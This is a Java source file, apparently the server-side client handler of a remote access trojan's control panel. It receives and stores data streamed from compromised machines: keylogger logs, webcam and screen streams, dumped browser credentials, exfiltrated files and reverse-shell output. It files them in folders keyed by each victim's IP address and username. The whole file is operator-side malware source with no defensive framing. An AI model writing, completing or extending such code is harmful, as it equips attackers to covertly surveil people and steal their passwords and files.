package Server;

import Packets.Identificators.Category;
import Packets.Identificators.Response;
import Packets.SysNetInfo.NetworkInformation;
import Packets.SysNetInfo.SystemInformation;
import Updater.UpdaterInterface;
import Utils.FileWriterTask;
import Utils.Time;
import org.eclipse.jetty.websocket.api.Session;
import org.json.JSONObject;

import java.io.IOException;
import java.nio.ByteBuffer;
import java.nio.file.Path;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.function.Consumer;
import Utils.UniqueByteIDGenerator;

public class Client {
    private final Session session;
    private final ExecutorService executor = Executors.newCachedThreadPool();

    public UpdaterInterface updater;
    private boolean isWebcamDialogOpen;
    private final UniqueByteIDGenerator uniqueByteIDGeneratorIn = new UniqueByteIDGenerator();
    private final UniqueByteIDGenerator uniqueByteIDGeneratorOut = new UniqueByteIDGenerator();
    private final Map<Response, Consumer<JSONObject>> mapOfResponses = new HashMap<>();
    private final ConcurrentHashMap<Byte, BytesChannel> activeChannels = new ConcurrentHashMap<>();

    public ConcurrentHashMap<Byte, BytesChannel> getFileChannels() {
        return activeChannels;
    }

    public Client(Session session) {
        this.session = session;
        this.updater = ConnectionStore.updaterFactory.createInstance();
        setupMapOfResponses();
    }

    public BytesChannel createFileChannel(Category category) {
        byte id = uniqueByteIDGeneratorIn.getID();
        BytesChannel channel = new BytesChannel(id, category, updater);
        activeChannels.put(id, channel);
        return channel;
    }

    public void handleFileCompletion(BytesChannel bytesChannel, byte[] finalData) {
        switch (bytesChannel.getCategory()) {
            case ZIP_FILE, WEBCAM_LOGS, KEYLOGGER_LOGS -> {
                String outputFolder = writeFile(finalData, bytesChannel.getCategoryOutputFolder());
                updater.showDownloadedFiles(outputFolder);
                closeFileChannel(bytesChannel.getId());
            }
            case WEBCAM_STREAMING -> {
                updater.updateFrameOfWebcamStreamer(finalData);
                bytesChannel.getBuffer().clear();
            }
            case SCREEN_STREAMING -> {
                updater.updateFrameOfScreenStreamer(finalData);
                bytesChannel.getBuffer().clear();
            }
            case BROWSER_CREDENTIALS -> {
                String outputPath = unzipCredentialsAndGetPath(finalData, bytesChannel.getCategoryOutputFolder());
                closeFileChannel(bytesChannel.getId());
                updater.updateCredentialsDumper(outputPath);
            }
        }
        // closeFileChannel(bytesChannel.getId());
    }



    // Cierra un FileChannel y libera su ID
    public void closeFileChannel(byte id) {
        activeChannels.remove(id);
        uniqueByteIDGeneratorIn.finishTask(id);
    }


    private void setupMapOfResponses() {
        mapOfResponses.put(Response.SYS_NET_INFO, updater::addRowOfNewConnection);
        mapOfResponses.put(Response.DISKS, updater::updateDisks);
        mapOfResponses.put(Response.DIRECTORY, updater::updateDirectory);
        mapOfResponses.put(Response.WEBCAM_DEVICES, updater::updateWebcamDevices);
        mapOfResponses.put(Response.SCREEN_DIMENSIONS, updater::setScreenDimensions);
        mapOfResponses.put(Response.MONITORS, updater::updateMonitors);
        mapOfResponses.put(Response.SHELL, updater::updateReverseShell);
        mapOfResponses.put(Response.PERMISSIONS, updater::showPermissionStatus);
    }


    public void processMessage(String message) {
        JSONObject object = new JSONObject(message);
        Consumer<JSONObject> action = mapOfResponses.get(Response.valueOf(object.getString("RESPONSE")));
        if (action != null) {
            action.accept(object);
        } else {
            System.out.println("Action not found!");
        }
    }

    public String writeFile(byte[] data, String category) {
        String finalNameOfFolder = category + " - " + new Time().getTime();
        Path pathOfDownload = Path.of(getSessionFolder(), finalNameOfFolder);
        FileWriterTask task = new FileWriterTask(data, pathOfDownload.toString());
        task.unzipFileInMemory();
        return pathOfDownload.toString();
    }

    public String unzipCredentialsAndGetPath(byte[] data, String category) {
        String finalNameOfFolder = category + " - " + new Time().getTime();
        Path pathOfDownload = Path.of(getSessionFolder(), finalNameOfFolder);
        FileWriterTask task = new FileWriterTask(data, pathOfDownload.toString());
        task.unzipFileInMemory();
        return pathOfDownload.toString();
    }

    public String getSessionFolder() {
        return "Session - " + getIdentifier();
    }


    public void sendString(String message) throws IOException {
        session.getRemote().sendString(message);
    }

    public void sendBytes(ByteBuffer byteBuffer) throws IOException {
        session.getRemote().sendBytes(byteBuffer);
    }

    public String getUUID() {
        return updater.getSystemInformation().UUID();
    }

    public String getIdentifier() {
        return updater.getNetworkInformation().IP() + " - " + updater.getSystemInformation().USER_NAME();
    }

    public Session getSession() {
        return session;
    }

    public UniqueByteIDGenerator getUniqueByteIDGeneratorOut() {
        return uniqueByteIDGeneratorOut;
    }


    public SystemInformation getSysInfo() {
        return updater.getSystemInformation();
    }

    public NetworkInformation getNetInfo() {
        return updater.getNetworkInformation();
    }

    public ExecutorService getExecutor() {
        return executor;
    }


    public boolean isWebcamDialogOpen() {
        return isWebcamDialogOpen;
    }

    public void setWebcamDialogOpen(boolean webcamDialogOpen) {
        isWebcamDialogOpen = webcamDialogOpen;
    }
}
